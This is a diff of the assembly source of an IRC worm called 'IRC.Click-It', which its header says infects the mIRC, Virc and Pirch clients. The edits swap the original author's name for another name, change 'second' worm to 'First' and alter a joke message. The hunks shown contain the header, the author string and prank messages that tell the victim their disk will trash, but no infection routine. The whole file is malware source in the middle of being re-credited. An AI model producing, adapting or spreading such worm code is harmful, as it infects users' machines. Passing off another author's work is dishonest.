@@ -1,11 +1,11 @@
 
 
-  ;########################-[ IRC.Click-It by SnakeByte ]-#########################;
+  ;########################-[ IRC.Click-It by ArdeanBimaSaputra ]-#########################;
   ;                                                                                ;
-  ; Here we go again, this is my second IRC-Worm and it                            ;
-  ; infects mIRC, Virc and Pirch. I wrote it in some minutes for the Realm-Zine,   ;
+  ; Shit, Here we go again, this is my First IRC-Worm and it                            ;
+  ; infects mIRC, Virc and Pirch. I wrote it in a few hours for the Realm-Zine,   ;
   ; cause Rhape wanted a Virc worm inside.. ;)                                     ;
-  ; It mainly bases on my first Worm                                               ;
+  ;                                                ;
   ; ( NBC , not IRC-Worm.Lucky as AVP detects it 'cause this nerd                  ;
   ; stole my code.. ok who cares *g* )                                             ;
   ;                                                                                ;
@@ -298,7 +298,7 @@ ret
 .DATA
 
  Wormname db 'IRC.Click-It',0
- Author   db 'by SnakeByte [KryptoCrew]',0
+ Author   db 'by ArdeanBimaSaputra [KryptoCrew]',0
 
   
 ;Data for mIRC infection
@@ -390,7 +390,7 @@ ret
              db "You know, that your disk trashes if you press the OFF button now !",0
              db "How do you feel ? Do I bore you ?",0
              db "Oh, I am sorry for this, so here we get a joke:", 10d, 13d
-                db "Why do programmers get Halloween and Christmas mixed up ?",0
+                db "Why do programmers get Ramadhan and IdulAdha mixed up ?",0
 
 ; Maybe you remember this joke from the asterix zine.. *g*
 
